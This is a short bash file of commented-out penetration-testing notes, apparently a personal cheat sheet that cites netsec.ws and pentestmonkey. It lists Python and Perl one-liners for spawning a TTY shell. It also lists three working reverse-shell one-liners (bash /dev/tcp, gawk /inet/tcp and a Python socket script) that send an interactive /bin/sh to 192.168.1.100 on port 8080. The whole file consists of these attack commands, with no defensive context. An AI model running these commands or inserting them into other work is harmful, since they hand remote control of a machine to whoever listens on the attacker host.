#!/bin/bash

# Spawning a TTY Shell
# Ref: http://netsec.ws/?p=337

# python -c 'import pty; pty.spawn("/bin/sh")'
# perl —e 'exec "/bin/sh";'


## Reverse shell
# Ref: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

# /bin/bash -i > /dev/tcp/192.168.1.100/8080 0<&1 2>&1
# /bin/bash -c "awk 'BEGIN{s=\"/inet/tcp/0/192.168.1.100/8080\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'"
# python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
